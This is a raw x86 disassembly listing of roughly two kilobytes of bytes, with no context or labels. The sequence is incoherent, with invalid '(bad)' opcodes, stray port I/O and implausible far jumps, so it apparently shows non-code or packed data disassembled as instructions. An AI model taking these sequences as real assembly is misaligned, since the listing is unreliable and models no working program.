  4037aa:	and    al,BYTE PTR [esi]
  4037ac:	sbb    cl,BYTE PTR [eax+edx*4]
  4037af:	push   ebp
  4037b0:	or     BYTE PTR [eax-0x3fe7fad9],al
  4037b6:	or     DWORD PTR [ebx],ecx
  4037b8:	bound  eax,QWORD PTR [edx]
  4037ba:	xor    BYTE PTR [edx-0x70],al
  4037bd:	(bad)  
  4037be:	in     al,0x2
  4037c0:	push   eax
  4037c1:	and    DWORD PTR [edx+esi*2],esi
  4037c4:	test   BYTE PTR [ebx+edx*2],al
  4037c7:	add    BYTE PTR [ebp+ecx*1-0x80],dl
  4037cb:	xor    BYTE PTR [ecx-0x40],ah
  4037ce:	mov    al,BYTE PTR [edx]
  4037d0:	inc    eax
  4037d1:	add    edx,esp
  4037d3:	add    ah,BYTE PTR [ecx-0x3c]
  4037d6:	or     BYTE PTR [edx],dl
  4037d8:	test   BYTE PTR [eax],cl
  4037da:	and    al,al
  4037dc:	add    DWORD PTR [eax+0x200023],ebx
  4037e2:	or     BYTE PTR [ecx+0x60054000],0x50
  4037e9:	add    BYTE PTR [esi],cl
  4037eb:	add    al,0x8
  4037ed:	add    BYTE PTR [eax+0x0],al
  4037f0:	sbb    BYTE PTR [eax+0x1194002],bh
  4037f6:	hlt    
  4037f7:	jo     0x4037f9
  4037f9:	adc    BYTE PTR [edx+0x8],al
  4037fc:	sub    ah,BYTE PTR [ebx]
  4037fe:	xor    dl,BYTE PTR [eax-0x357fdffe]
  403804:	inc    edx
  403805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403806:	add    BYTE PTR [edx+eax*2-0x24],al
  40380a:	adc    BYTE PTR [eax],cl
  40380c:	adc    eax,0x5417d240
  403811:	add    eax,0x2e231843
  403816:	mov    ah,BYTE PTR [esi+0x69]
  403819:	test   BYTE PTR [eax],cl
  40381b:	adc    BYTE PTR [edx],bl
  40381d:	shl    BYTE PTR [edx+0x60c1454],1
  403823:	add    al,0x55
  403825:	mov    BYTE PTR [ecx],ch
  403827:	cmp    BYTE PTR [eax+eiz*1],al
  40382a:	and    dl,cl
  40382c:	inc    eax
  40382d:	or     BYTE PTR [eax],cl
  40382f:	or     eax,0x18838042
  403834:	adc    ebx,eax
  403836:	add    eax,0xd1123500
  40383b:	inc    edx
  40383c:	add    BYTE PTR [eax],0xa4
  40383f:	add    dl,BYTE PTR [ebx]
  403841:	sbb    BYTE PTR [ecx+esi*1],cl
  403844:	pusha  
  403845:	or     BYTE PTR [eax],dh
  403847:	xor    BYTE PTR [eax-0x2bdefbf8],al
  40384d:	xor    BYTE PTR [eax+0x4],cl
  403850:	les    eax,FWORD PTR [edx+0x51d2101]
  403856:	sub    BYTE PTR [ecx+0x3131294],dl
  40385c:	add    BYTE PTR [ebx],bh
  40385e:	and    DWORD PTR [eax+0x18],0x30000863
  403865:	inc    esp
  403866:	add    edx,ecx
  403868:	add    al,BYTE PTR [eax]
  40386a:	add    DWORD PTR [eax+edi*1],esi
  40386d:	push   es
  40386e:	add    dl,dl
  403870:	inc    edx
  403871:	sbb    ebp,ebx
  403873:	bound  eax,QWORD PTR [eax-0x2a]
  403876:	or     ah,al
  403878:	adc    BYTE PTR [eax],0xb1
  40387b:	push   eax
  40387c:	inc    eax
  40387d:	push   esp
  40387e:	sub    BYTE PTR ds:0x10850342,bl
  403884:	add    BYTE PTR [edx],al
  403886:	add    DWORD PTR [esp+eax*1],eax
  403889:	and    DWORD PTR [ecx+0x47010065],eax
  40388f:	fiadd  WORD PTR [edx]
  403891:	test   BYTE PTR [ecx+0x7c],al
  403894:	add    dh,al
  403896:	adc    ch,ah
  403898:	add    DWORD PTR [eax+0x4f],edx
  40389b:	test   BYTE PTR [eax-0x27ffba00],al
  4038a1:	add    BYTE PTR [eax+0x12204294],ch
  4038a7:	dec    eax
  4038a8:	inc    eax
  4038a9:	adc    DWORD PTR [eax],eax
  4038ab:	and    BYTE PTR [eax],dl
  4038ad:	or     al,BYTE PTR [eax+0x40226802]
  4038b3:	add    al,BYTE PTR [ecx]
  4038b5:	add    al,0x48
  4038b7:	or     edx,eax
  4038b9:	add    BYTE PTR [eax],ah
  4038bb:	or     DWORD PTR [eax+0x40],esp
  4038be:	rol    BYTE PTR [eax],1
  4038c0:	and    BYTE PTR [esi],dl
  4038c2:	inc    esp
  4038c3:	gs dec esp
  4038c5:	inc    ecx
  4038c6:	add    BYTE PTR [edx-0x7c],cl
  4038c9:	and    BYTE PTR [eax],al
  4038cb:	inc    edx
  4038cc:	add    BYTE PTR [eax],bl
  4038ce:	or     ah,BYTE PTR [esp+esi*1]
  4038d1:	or     BYTE PTR [eax],0x50
  4038d4:	inc    esp
  4038d5:	add    BYTE PTR [eax+0x2812087],0xca
  4038dc:	add    al,BYTE PTR [esp+ecx*1]
  4038df:	in     al,dx
  4038e0:	inc    eax
  4038e1:	pop    es
  4038e2:	inc    ecx
  4038e3:	adc    eax,DWORD PTR [eax+eax*1]
  4038e6:	adc    cl,BYTE PTR [eax+0x900078]
  4038ec:	and    DWORD PTR [eax-0x7f],eax
  4038ef:	push   eax
  4038f0:	add    BYTE PTR cs:[edx+0x1],dl
  4038f4:	push   edx
  4038f5:	add    BYTE PTR [eax],al
  4038f7:	add    al,0x2e
  4038f9:	ret    
  4038fa:	mov    dl,dl
  4038fc:	and    BYTE PTR [edx+0x49],0x21
  403900:	shr    BYTE PTR [edx+eax*1],0xab
  403904:	adc    BYTE PTR [eax],ah
  403906:	xor    BYTE PTR [eax-0x6efbf7d0],bl
  40390c:	dec    ebp
  40390d:	or     BYTE PTR [edx],al
  40390f:	dec    edx
  403910:	add    BYTE PTR [esi],al
  403912:	push   0xffffff80
  403914:	add    DWORD PTR [ecx],eax
  403916:	xchg   BYTE PTR [esp+ecx*4-0x3fa67ffe],dl
  40391d:	add    BYTE PTR [eax],bl
  40391f:	push   eax
  403920:	inc    edx
  403921:	xor    BYTE PTR [eax],al
  403923:	add    edx,DWORD PTR [eax]
  403925:	add    dl,BYTE PTR [esi]
  403927:	rol    BYTE PTR [eax],0xd4
  40392a:	add    BYTE PTR [ebx+0x1a],0xa4
  40392e:	or     BYTE PTR [esp+ecx*2],dl
  403931:	or     BYTE PTR [eax],al
  403933:	and    eax,0xd08085a0
  403938:	add    ah,BYTE PTR [ebp+0x50]
  40393b:	test   BYTE PTR [eax],cl
  40393d:	leave  
  40393e:	add    cl,BYTE PTR [ecx]
  403940:	or     BYTE PTR [edx+0x4a],al
  403943:	lods   al,BYTE PTR ds:[esi]
  403944:	add    BYTE PTR [eax+0x34],cl
  403947:	add    ah,BYTE PTR [eax+eax*1]
  40394a:	nop
  40394b:	jbe    0x40395d
  40394d:	and    al,0xc3
  40394f:	xor    dh,BYTE PTR [eax]
  403951:	push   eax
  403952:	and    DWORD PTR [eax],ebx
  403954:	or     BYTE PTR [eax+0xb386421],al
  40395a:	add    BYTE PTR [eax],cl
  40395c:	or     BYTE PTR [edx],al
  40395e:	add    al,0x8
  403960:	add    BYTE PTR [eax],ah
  403962:	add    BYTE PTR [ebx],bl
  403964:	shl    BYTE PTR [eax+eiz*1],0x22
  403968:	add    BYTE PTR [eax],dl
  40396a:	add    BYTE PTR [esp+eiz*8],al
  40396d:	and    al,0x2
  40396f:	add    bl,BYTE PTR [ecx]
  403971:	add    al,al
  403973:	add    BYTE PTR [ebx],ah
  403975:	or     DWORD PTR [ecx],eax
  403977:	adc    BYTE PTR [eax],al
  403979:	inc    ecx
  40397a:	pop    eax
  40397b:	add    BYTE PTR [edx-0x47fde76e],al
  403981:	loopne 0x403923
  403983:	inc    esp
  403984:	add    DWORD PTR [ebx+0x30610000],eax
  40398a:	or     BYTE PTR [esp+edx*2-0x34],0x99
  40398f:	adc    BYTE PTR [eax],dl
  403991:	dec    eax
  403992:	es or  al,0x44
  403995:	push   es
  403996:	add    BYTE PTR [edx+edx*1],cl
  403999:	and    BYTE PTR [eax+0x4a95404a],bl
  40399f:	xor    DWORD PTR [eax],eax
  4039a1:	leave  
  4039a2:	add    BYTE PTR [eax],0x40
  4039a5:	and    DWORD PTR [eax],eax
  4039a7:	dec    esp
  4039a8:	or     al,BYTE PTR [eax+0x0]
  4039ab:	sub    al,0x14
  4039ad:	sbb    ch,BYTE PTR [ecx]
  4039af:	add    eax,0x102244c4
  4039b4:	dec    edx
  4039b5:	adc    BYTE PTR [edi+0x0],al
  4039b8:	add    DWORD PTR [ecx],eax
  4039ba:	add    BYTE PTR ds:0x18a9ad06,al
  4039c0:	adc    cl,ah
  4039c2:	les    ecx,FWORD PTR [eax]
  4039c4:	sub    BYTE PTR [eax],cl
  4039c6:	mov    DWORD PTR [eax+0x4c],esp
  4039c9:	pusha  
  4039ca:	or     al,al
  4039cc:	and    BYTE PTR [ecx],al
  4039ce:	and    ah,BYTE PTR [esp+ecx*2+0x22]
  4039d2:	and    DWORD PTR [eax],eax
  4039d4:	and    BYTE PTR [eax],dl
  4039d6:	inc    edx
  4039d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d8:	nop
  4039d9:	add    al,BYTE PTR [ebx+0x10c00414]
  4039df:	or     BYTE PTR [ecx],cl
  4039e1:	mov    DWORD PTR [eax+0x36420b],edi
  4039e7:	add    BYTE PTR [ecx],dl
  4039e9:	mov    es,WORD PTR [eax]
  4039eb:	shl    BYTE PTR [ebp-0x5e],0x4b
  4039ef:	and    DWORD PTR [edx],eax
  4039f1:	rol    BYTE PTR [edx-0x43efbdf8],0x90
  4039f8:	add    DWORD PTR [ecx],edx
  4039fa:	rol    DWORD PTR [ecx],0x16
  4039fd:	add    al,0x88
  4039ff:	inc    esi
  403a00:	add    al,0xc
  403a02:	cmp    BYTE PTR [eax],0x10
  403a05:	add    al,0x13
  403a07:	xor    al,0x20
  403a09:	or     BYTE PTR [eax],cl
  403a0b:	sub    dl,BYTE PTR [esp+eax*1]
  403a0e:	mov    edx,0x1611320
  403a13:	sbb    BYTE PTR [eax+0x43],cl
  403a16:	and    BYTE PTR [eax],al
  403a18:	jno    0x403a60
  403a1a:	add    al,0x5d
  403a1c:	or     bl,BYTE PTR [edx]
  403a1e:	or     DWORD PTR [ecx+eax*2],ecx
  403a21:	add    DWORD PTR ds:0x60000000,eax
  403a27:	inc    esp
  403a28:	and    al,0x20
  403a2a:	push   esp
  403a2b:	adc    eax,0x2001200
  403a30:	xor    al,0x40
  403a32:	sub    BYTE PTR [edx+0x5121022],ah
  403a38:	add    DWORD PTR [eax],eax
  403a3a:	adc    edx,DWORD PTR [eax]
  403a3c:	mov    al,ds:0x1000f084
  403a41:	or     esp,DWORD PTR [eax]
  403a43:	add    BYTE PTR [edx+0x11b20c00],ah
  403a49:	and    al,0x21
  403a4b:	and    DWORD PTR [edx+ecx*8+0xa00d064],esp
  403a52:	adc    al,0xc0
  403a54:	adc    al,BYTE PTR [edx*4-0x3b97e6f8]
  403a5b:	pusha  
  403a5c:	xchg   ecx,eax
  403a5d:	dec    esi
  403a5e:	test   al,0xc0
  403a60:	add    BYTE PTR [ecx+0x24112330],ch
  403a66:	add    dl,BYTE PTR [eax+ebp*1+0x4020008]
  403a6d:	adc    DWORD PTR [eax-0x27],edx
  403a70:	adc    BYTE PTR [edx],0x12
  403a73:	adc    BYTE PTR [ecx],al
  403a75:	add    BYTE PTR ds:0xc00686a2,cl
  403a7b:	sub    BYTE PTR [ecx+0x2],dl
  403a7e:	leave  
  403a7f:	add    DWORD PTR [ecx],ecx
  403a81:	nop
  403a82:	xor    BYTE PTR [eax+0x44224840],al
  403a88:	or     BYTE PTR [ebx+edx*1+0x4c],al
  403a8c:	inc    ebp
  403a8d:	inc    eax
  403a8e:	pop    eax
  403a8f:	and    DWORD PTR [ecx+0x4],0x19111080
  403a96:	pop    esp
  403a97:	and    al,0x0
  403a99:	push   0xd010121
  403a9e:	mov    cs,WORD PTR [eax+0x41]
  403aa1:	mov    BYTE PTR [ecx],ch
  403aa3:	sub    BYTE PTR [edx-0x765efac0],al
  403aa9:	adc    DWORD PTR [eax+eax*1+0x44],0x78a128a0
  403ab1:	inc    eax
  403ab2:	sbb    BYTE PTR [edx],cl
  403ab4:	add    DWORD PTR [eax+0x4064a2e6],eax
  403aba:	add    al,0x0
  403abc:	test   dh,ch
  403abe:	and    al,0x48
  403ac0:	push   eax
  403ac1:	and    BYTE PTR [ecx],al
  403ac3:	add    BYTE PTR [eax],ch
  403ac5:	and    BYTE PTR ss:[eax-0x79d67ea8],al
  403acc:	mov    BYTE PTR [eax-0x7b92ffff],ah
  403ad2:	add    DWORD PTR [edx+0x462221cc],0x5385a002
  403adc:	and    BYTE PTR [ecx+0x11d28226],0x10
  403ae3:	add    BYTE PTR [eax],bl
  403ae5:	adc    eax,DWORD PTR [eax+0x41]
  403ae8:	bound  eax,QWORD PTR [eax]
  403aea:	popa   
  403aeb:	xor    bl,BYTE PTR [ecx]
  403aed:	or     eax,DWORD PTR [eax+0x4745588]
  403af3:	push   es
  403af4:	sub    bl,BYTE PTR [eax]
  403af6:	or     eax,0x31439580
  403afb:	add    al,0x34
  403afd:	add    DWORD PTR [eax],0x11
  403b00:	xchg   ebp,eax
  403b01:	or     BYTE PTR [esi+0x31],0x10
  403b05:	dec    eax
  403b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b07:	inc    edx
  403b08:	add    BYTE PTR [ecx+ecx*4-0x66],al
  403b0c:	xor    eax,0x1052004a
  403b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b12:	dec    edx
  403b13:	ret    0xb280
  403b16:	test   DWORD PTR [eax],eax
  403b18:	adc    DWORD PTR [edx-0x72bed5c0],eax
  403b1e:	add    dl,ah
  403b20:	sbb    BYTE PTR [eax],al
  403b22:	push   es
  403b23:	adc    al,0x12
  403b26:	add    eax,DWORD PTR [eax]
  403b28:	add    cl,BYTE PTR [ecx+0x59]
  403b2b:	aaa    
  403b2c:	add    al,0x54
  403b2e:	add    al,BYTE PTR [eax]
  403b30:	pusha  
  403b31:	xchg   BYTE PTR [eax],cl
  403b33:	add    al,0x8
  403b35:	dec    edx
  403b36:	xchg   DWORD PTR [eax+0x3491030],eax
  403b3c:	add    esp,DWORD PTR [eax-0x73cf6a00]
  403b42:	adc    DWORD PTR [ebx],esp
  403b44:	add    eax,0xb0184d3
  403b49:	fimul  DWORD PTR [ecx]
  403b4b:	add    BYTE PTR [eax],al
  403b4d:	sbb    BYTE PTR [eax+0x10],ch
  403b50:	test   BYTE PTR [edx],dl
  403b52:	adc    al,0x11
  403b54:	lea    edx,[eax+0x40030]
  403b5a:	cmp    ah,dl
  403b5c:	sbb    cl,al
  403b5e:	add    al,BYTE PTR [eax+0x29001088]
  403b64:	add    ch,BYTE PTR [eax]
  403b66:	cwde   
  403b67:	or     al,0x2
  403b69:	add    BYTE PTR [edx+0x212903],cl
  403b6f:	adc    BYTE PTR [esp+edx*1+0xa81088],ch
  403b76:	xchg   edx,eax
  403b77:	add    eax,0x44202002
  403b7c:	or     BYTE PTR [esp+eax*1+0x8],dl
  403b80:	adc    al,BYTE PTR [edx]
  403b82:	sub    DWORD PTR [edx-0x80],eax
  403b85:	or     BYTE PTR [eax],bl
  403b87:	and    BYTE PTR [ecx+0x48],al
  403b8a:	xchg   esi,eax
  403b8b:	jmp    0x1623b92
  403b90:	lea    edx,[eax-0x37edeebc]
  403b96:	push   ebx
  403b97:	adc    al,0x10
  403b99:	sbb    BYTE PTR [esi],al
  403b9b:	and    BYTE PTR [edx],cl
  403b9d:	rcl    DWORD PTR es:0x282388a,1
  403ba4:	lods   eax,DWORD PTR ds:[esi]
  403ba5:	mov    fs,WORD PTR [ecx+0x28004c26]
  403bab:	add    cl,BYTE PTR [ecx+0x1015082a]
  403bb1:	loopne 0x403bb3
  403bb3:	add    DWORD PTR [ecx+0x11],eax
  403bb6:	cwde   
  403bb7:	or     DWORD PTR [ecx+0x0],eax
  403bba:	add    ah,BYTE PTR [eax]
  403bbc:	inc    ebp
  403bbd:	add    esp,ebp
  403bbf:	sub    cl,BYTE PTR [eax+eax*1]
  403bc2:	add    al,0x2
  403bc4:	sbb    DWORD PTR [eax+0x2a],eax
  403bc7:	cwde   
  403bc8:	mov    ecx,es
  403bca:	add    BYTE PTR [eax+ecx*1],al
  403bcd:	or     al,0x0
  403bcf:	dec    eax
  403bd0:	or     DWORD PTR [eax+0x43835822],eax
  403bd6:	inc    edx
  403bd7:	test   DWORD PTR [eax],ecx
  403bd9:	or     DWORD PTR [ebx],esp
  403bdb:	add    cl,BYTE PTR [ecx]
  403bdd:	shl    BYTE PTR [eax],1
  403bdf:	inc    eax
  403be0:	and    al,0x27
  403be2:	add    BYTE PTR [eax],al
  403be4:	adc    BYTE PTR [edx],al
  403be6:	mov    DWORD PTR [eax],eax
  403be8:	add    BYTE PTR [ecx+0xc6844a],al
  403bee:	or     BYTE PTR [eax],al
  403bf0:	and    BYTE PTR [eax+0x2a084080],0x50
  403bf7:	rol    BYTE PTR [ebp+0xd4c5a1c],1
  403bfd:	pop    ebx
  403bfe:	add    DWORD PTR [edx+ecx*1],esp
  403c01:	inc    esp
  403c02:	or     BYTE PTR [eax+esi*1-0x5bfd3ffb],cl
  403c09:	inc    ebx
  403c0a:	or     BYTE PTR [eax+eax*1+0x38],al
  403c0e:	and    BYTE PTR [eax],cl
  403c10:	les    eax,FWORD PTR [ecx+0x40001490]
  403c16:	mov    ds:0x80014648,al
  403c1b:	inc    esp
  403c1c:	add    dl,BYTE PTR [eax+0x12a1e114]
  403c22:	add    BYTE PTR [edx],dl
  403c24:	adc    BYTE PTR [eax],dh
  403c26:	xchg   esp,eax
  403c27:	add    DWORD PTR [edx+edx*1],0x1143971
  403c2e:	dec    ebp
  403c2f:	adc    BYTE PTR [eax],bl
  403c31:	add    BYTE PTR [eax],dl
  403c33:	add    BYTE PTR [eax+0x41083a0],al
  403c39:	add    BYTE PTR [eax+eax*1+0x10],al
  403c3d:	and    BYTE PTR [ecx],ah
  403c3f:	jmp    0xc05c54e8
  403c44:	inc    esp
  403c45:	or     ebp,DWORD PTR [eax]
  403c47:	or     BYTE PTR [ecx],ah
  403c49:	adc    dh,BYTE PTR [ebx]
  403c4b:	add    BYTE PTR [eax],al
  403c4d:	sbb    al,BYTE PTR [eax]
  403c4f:	inc    eax
  403c50:	pop    eax
  403c51:	or     BYTE PTR [ebx],dh
  403c53:	cdq    
  403c54:	fiadd  DWORD PTR [ecx]
  403c56:	mov    al,0x80
  403c58:	inc    eax
  403c59:	popf   
  403c5a:	push   ss
  403c5b:	add    BYTE PTR [edx],al
  403c5d:	lock push 0x40014484
  403c63:	adc    BYTE PTR [eax+0x5],al
  403c66:	add    bl,BYTE PTR [edx+eax*1]
  403c69:	add    DWORD PTR [eax],eax
  403c6b:	adc    DWORD PTR [edx+0x2d],esp
  403c6e:	add    BYTE PTR [edx+0x8ab660],bl
  403c74:	adc    BYTE PTR [ebp+0x20],cl
  403c77:	rol    BYTE PTR [eax],0x80
  403c7a:	add    al,0x1
  403c7c:	or     BYTE PTR [eax],al
  403c7e:	inc    edx
  403c7f:	add    BYTE PTR [esi],dl
  403c81:	adc    BYTE PTR ds:0x19d48,al
  403c87:	es and al,0xc1
  403c8a:	and    DWORD PTR [esi+0x1],edx
  403c8d:	inc    ecx
  403c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8f:	test   BYTE PTR [edx],ah
  403c91:	bound  eax,QWORD PTR [eax]
  403c93:	add    BYTE PTR [eax+0x0],dl
  403c96:	add    al,0x24
  403c98:	sbb    DWORD PTR [ecx],ecx
  403c9a:	test   BYTE PTR ds:0x4200034,al
  403ca0:	sub    BYTE PTR [eax+0x11160120],al
  403ca6:	sbb    BYTE PTR [edx],0x0
  403ca9:	push   esi
  403caa:	add    BYTE PTR [ecx+0x41dc0004],al
  403cb0:	popa   
  403cb1:	test   eax,0x10447
  403cb6:	cld    
  403cb7:	sub    BYTE PTR [eax+eax*1-0x37feaddb],al
  403cbe:	add    eax,DWORD PTR es:[edx]
  403cc1:	push   0xc802722
  403cc6:	sbb    al,0x0
  403cc8:	xchg   esp,eax
  403cc9:	adc    edx,DWORD PTR [ebp+0x74]
  403ccc:	inc    eax
  403ccd:	push   eax
  403cce:	or     DWORD PTR [eax+ecx*1+0x21000e1],ebx
  403cd5:	or     BYTE PTR [esi],cl
  403cd7:	inc    eax
  403cd8:	adc    al,BYTE PTR [eax]
  403cda:	add    DWORD PTR [eax],ecx
  403cdc:	push   eax
  403cdd:	nop
  403cde:	add    al,0x62
  403ce0:	push   es
  403ce1:	mov    esp,0x2006086
  403ce6:	test   BYTE PTR [eax+0x5],al
  403ce9:	test   al,0x84
  403ceb:	dec    edi
  403cec:	pusha  
  403ced:	add    BYTE PTR [eax+ecx*4],al
  403cf0:	imul   eax,DWORD PTR [edx],0x1b408050
  403cf6:	add    al,0xb
  403cf8:	cs test ecx,0x31200022
  403cff:	add    DWORD PTR [eax+0x10ce1624],eax
  403d05:	add    al,0x39
  403d07:	xor    dl,BYTE PTR [eax-0x2fb6f600]
  403d0d:	push   es
  403d0e:	add    BYTE PTR [eax+eiz*4-0x7ffff5fc],al
  403d15:	mov    BYTE PTR [eax+0x20804c08],al
  403d1b:	adc    BYTE PTR [edx],al
  403d1d:	sub    DWORD PTR [eax],eax
  403d1f:	icebp  
  403d20:	add    BYTE PTR [eax+eax*1-0x4e],0x60
  403d25:	add    al,BYTE PTR [eax+0x40]
  403d28:	add    DWORD PTR [eax+0x5800118],eax
  403d2e:	test   BYTE PTR [ecx],ah
  403d30:	sbb    BYTE PTR [eax+0x8248280],cl
  403d36:	adc    DWORD PTR [esp+eiz*2],ecx
  403d39:	or     al,BYTE PTR [ecx+0x5000858]
  403d3f:	pop    es
  403d40:	and    al,0x2
  403d42:	and    DWORD PTR [edx+0x50e6aca],eax
  403d48:	or     bl,BYTE PTR fs:[ecx]
  403d4b:	mov    al,ds:0x14200839
  403d50:	or     al,0x88
  403d52:	ja     0x403d54
  403d54:	dec    ecx
  403d55:	or     BYTE PTR [eax],al
  403d57:	add    BYTE PTR [eax],0x3
  403d5a:	dec    eax
  403d5b:	pusha  
  403d5c:	mov    edx,?
  403d5e:	add    DWORD PTR [ebx+0x52],eax
  403d61:	sbb    BYTE PTR [eax+0x16],al
  403d64:	add    BYTE PTR [eax-0x7353fff6],0x44
  403d6b:	add    al,BYTE PTR [ecx]
  403d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d6e:	mov    al,ss:0x3048e8
  403d74:	mov    al,ds:0x40061100
  403d79:	add    al,0x18
  403d7b:	add    BYTE PTR [eax],al
  403d7d:	and    BYTE PTR [edx+0x2],ah
  403d80:	push   ecx
  403d81:	test   BYTE PTR [esp+eiz*8],dl
  403d84:	cwde   
  403d85:	xchg   ecx,eax
  403d86:	add    eax,0x8118441
  403d8b:	adc    eax,0x20c43240
  403d90:	add    BYTE PTR [esp+eax*1+0x102840c1],cl
  403d97:	cmp    BYTE PTR [eax+ecx*1],dh
  403d9a:	add    cl,BYTE PTR [eax+0x51]
  403d9d:	add    ah,BYTE PTR [eax]
  403d9f:	add    dl,bh
  403da1:	adc    ah,BYTE PTR [eax+0x0]
  403da4:	or     dl,BYTE PTR [eax]
  403da6:	or     DWORD PTR [eax+0x2b561229],ecx
  403dac:	sub    al,0xc2
  403dae:	adc    BYTE PTR [edi-0x7d],cl
  403db1:	pusha  
  403db2:	xor    BYTE PTR [ecx],al
  403db4:	gs inc esi
  403db6:	fwait
  403db7:	add    ch,BYTE PTR [ecx-0x3c]
  403dba:	add    DWORD PTR ds:0x10380083,eax
  403dc0:	push   ax
  403dc2:	add    al,0x0
  403dc4:	add    BYTE PTR [edx],ah
  403dc6:	adc    eax,0xe6d0a6a2
  403dcb:	inc    esp
  403dcc:	mov    DWORD PTR [eax],esp
  403dce:	add    al,0x0
  403dd1:	and    eax,0x349001
  403dd6:	bound  eax,QWORD PTR [eax]
  403dd8:	and    BYTE PTR ds:0xb5a40022,al
  403dde:	or     BYTE PTR [eax],dh
  403de0:	test   eax,0xa0809a1
  403de5:	sbb    DWORD PTR [ecx],eax
  403de7:	shl    BYTE PTR [eax],0x5
  403dea:	mov    al,ds:0x900049c9
  403def:	dec    edx
  403df0:	push   ss
  403df1:	or     BYTE PTR [eax+ecx*2],al
  403df4:	push   eax
  403df5:	inc    ebp
  403df6:	and    al,0xa4
  403df8:	push   edx
  403df9:	xor    BYTE PTR [eax],cl
  403dfb:	add    BYTE PTR [esp+eax*1],bh
  403dfe:	and    BYTE PTR [eax],al
  403e00:	xor    edx,DWORD PTR [eax+0x11c4900a]
  403e06:	add    BYTE PTR [ecx+0x4],0x39
  403e0a:	or     BYTE PTR [eax],al
  403e0c:	mov    al,ds:0x48484401
  403e11:	cmp    al,0x10
  403e13:	and    DWORD PTR [eax],esp
  403e15:	inc    ecx
  403e16:	adc    BYTE PTR [edx-0x76],al
  403e19:	adc    BYTE PTR [ecx],bl
  403e1b:	call   0x1125:0xca889820
  403e22:	adc    BYTE PTR [ecx+0x1c1754],ah
  403e28:	xchg   ecx,eax
  403e29:	adc    bl,bh
  403e2b:	add    esi,DWORD PTR ds:0x466510
  403e31:	push   cs
  403e32:	and    BYTE PTR [eax],al
  403e34:	add    al,BYTE PTR ds:0x1e060806
  403e3a:	add    cl,BYTE PTR [ecx+0x40]
  403e3d:	stos   BYTE PTR es:[edi],al
  403e3e:	and    eax,0x92c20426
  403e43:	adc    BYTE PTR fs:[esi],0xc0
  403e47:	inc    dx
  403e49:	add    BYTE PTR [eax-0x55fd3fe3],al
  403e4f:	adc    al,0x12
  403e51:	inc    ebp
  403e52:	add    ch,BYTE PTR [eax+eiz*1]
  403e55:	add    BYTE PTR [eax],cl
  403e57:	add    BYTE PTR [eax],0x40
  403e5a:	and    DWORD PTR [ecx+eax*1],esp
  403e5d:	add    DWORD PTR [eax],eax
  403e5f:	adc    ah,BYTE PTR [eax+0x6]
  403e62:	mov    DWORD PTR [eax],edx
  403e64:	and    al,0x56
  403e66:	pusha  
  403e67:	inc    esp
  403e68:	inc    ecx
  403e69:	and    BYTE PTR [ecx],dl
  403e6b:	add    eax,0x8a1a0820
  403e70:	add    DWORD PTR [esp+eax*2+0x4a0019],ecx
  403e77:	xor    BYTE PTR [eax+0x3],ah
  403e7a:	add    BYTE PTR [ebx],bl
  403e7c:	jo     0x403ebf
  403e7e:	adc    BYTE PTR [eax+eax*1],dl
  403e81:	sub    BYTE PTR ss:[eax+0x28162402],al
  403e88:	add    al,0x20
  403e8a:	xor    ecx,DWORD PTR [esp+edx*2+0x45019c4]
  403e91:	dec    ecx
  403e92:	adc    BYTE PTR [eax],cl
  403e94:	or     DWORD PTR [eax-0x6f],ebx
  403e97:	rol    ah,0x10
  403e9a:	push   ebp
  403e9b:	push   edx
  403e9c:	mov    al,ds:0x40400b8
  403ea1:	pop    edx
  403ea2:	add    BYTE PTR [eax+eax*4+0xa610b0],al
  403ea9:	mov    ds:0x41db85,al
  403eae:	cmp    DWORD PTR [eax],eax
  403eb0:	test   BYTE PTR [ecx-0x7e97ff43],al
  403eb6:	aaa    
  403eb7:	inc    edx
  403eb8:	rcr    BYTE PTR ds:0x8085,1
  403ebe:	pop    esp
  403ebf:	test   DWORD PTR [eax],eax
  403ec1:	add    BYTE PTR [ebx+0x1a2040c],bl
  403ec7:	les    edx,FWORD PTR [ecx+0x12050005]
  403ecd:	xchg   ecx,eax
  403ece:	inc    esp
  403ecf:	pusha  
  403ed0:	aam    0x88
  403ed2:	pop    eax
  403ed3:	or     BYTE PTR [eax+ebp*2],dh
  403ed6:	xchg   edx,eax
  403ed7:	sub    BYTE PTR [eax],dl
  403ed9:	add    eax,0x5e012008
  403ede:	add    al,0x18
  403ee0:	and    DWORD PTR [esi+0x2016a910],eax
  403ee6:	push   edi
  403ee7:	xor    al,0x24
  403ee9:	xor    BYTE PTR [ecx],al
  403eeb:	mov    al,0x4
  403eed:	sbb    BYTE PTR [ebp+ecx*1+0x12c804],dl
  403ef4:	and    BYTE PTR [eax+eax*1],dl
  403ef7:	adc    al,0x44
  403ef9:	add    BYTE PTR [eax],al
  403efb:	lds    esp,FWORD PTR [ebx+eax*1+0x518c15ff]
  403f02:	inc    ebx
  403f03:	add    BYTE PTR [edx+0x41780623],al
  403f09:	sub    DWORD PTR [ecx],0x8900824
  403f0f:	add    BYTE PTR [eax-0x80],al
  403f12:	xor    eax,0x130322cc
  403f17:	pusha  
  403f18:	mov    BYTE PTR [eax+0xc028004],dl
  403f1e:	xor    DWORD PTR [ecx+0x18001ca0],eax
  403f24:	popa   
  403f25:	ret    0x5cd
  403f28:	pop    es
  403f29:	inc    ebp
  403f2a:	adc    BYTE PTR [eax+0x2],ah
  403f2d:	sub    BYTE PTR [eax],ch
  403f2f:	adc    BYTE PTR [ecx],ah
  403f31:	mov    eax,0x20a40342
  403f36:	nop
  403f37:	push   es
  403f38:	and    al,BYTE PTR [esp+ebx*4]
  403f3b:	xor    al,BYTE PTR [edx+edx*2]
  403f3e:	mov    ds:0x1038408,al
  403f43:	mov    al,ds:0x54010012
  403f48:	mov    cl,0x1
  403f4a:	sub    eax,DWORD PTR [esi+0x882201]
  403f50:	popf   
  403f51:	cwde   
  403f52:	sub    DWORD PTR [eax],0xffffff85
  403f55:	or     BYTE PTR es:[eax+0x22],cl
  403f59:	inc    esi
  403f5a:	mov    al,ds:0x49503230
  403f5f:	jno    0x403f7b
  403f61:	adc    DWORD PTR [eax+0x1],esp
  403f64:	sub    DWORD PTR [eax-0x3fafff4e],esi
  403f6a:	add    BYTE PTR [esi+0x65],0x0
  403f6e:	nop
  403f6f:	add    BYTE PTR [eax+ebx*1],0x54
